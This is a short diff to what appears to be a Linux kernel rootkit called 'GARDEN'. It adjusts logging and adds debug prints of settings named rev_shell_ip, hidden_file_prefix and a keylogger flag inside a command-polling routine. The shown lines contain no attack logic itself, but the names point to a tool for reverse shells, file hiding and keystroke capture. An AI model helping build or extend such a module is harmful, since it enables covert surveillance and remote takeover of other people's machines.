@@ -85,7 +85,7 @@ static void poll_for_commands(unsigned long data);
  */
 
 void log_info(const char *message) {
-    printk(KERN_INFO "%s %s", "GARDEN:", message);
+    printk(KERN_INFO "GARDEN: %s", message);
 }
 
 void log_error(const char *message) {
@@ -205,7 +205,12 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
  */
 static void poll_for_commands(unsigned long data) {
     // TODO: Store previous values of variables somewhere.
-    //printk(KERN_INFO "Polling for commands!\n");
+    log_info("Polling for commands!\n");
+	printk(KERN_INFO "rev_shell_ip: %s", rev_shell_ip);
+	printk(KERN_INFO "hidden_file_prefix: %s", hidden_file_prefix);
+	printk(KERN_INFO "rev_shell_ip: %s", rev_shell_ip);
+	printk(KERN_INFO "keylogger enabled: %d", keylogger);
+
     if (rev_shell_ip != cmds.rev_shell_ip) {
         printk(KERN_INFO "rev_shell_ip updated: %s\n", rev_shell_ip);
         cmds.rev_shell_ip = rev_shell_ip;
